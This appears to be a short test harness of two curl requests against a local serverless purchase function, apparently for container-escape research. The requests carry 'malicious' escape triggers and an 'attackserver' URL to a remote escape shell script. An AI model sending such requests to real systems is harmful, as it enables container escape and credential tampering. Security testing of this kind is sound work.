curl -X POST \
  http://localhost:31112/function/zjy-2n-product-purchase \
  -H "Content-Type: application/json" \
  -H "uuid: credentials-modify-escape-1" \
  -d '{
      "id": 1,
      "user": "alice",
      "creditCard": "1234-5678-9",
      "malicious": "escape_S1",
      "attackserver": "https://gitee.com/jinyuchata/escape-host/raw/master/escape2.sh"
  }'
      # "attackserver": "https://gitee.com/jinyuchata/escape-host/raw/master/escape2.sh"

curl -X POST \
  http://localhost:31112/function/zjy-2n-product-purchase \
  -H "Content-Type: application/json" \
  -H "uuid: credentials-modify-escape-2" \
  -d '{
      "id": 1,
      "user": "alice",
      "creditCard": "1234-5678-9",
      "malicious": "escape_S2",
      "payload": ""
  }'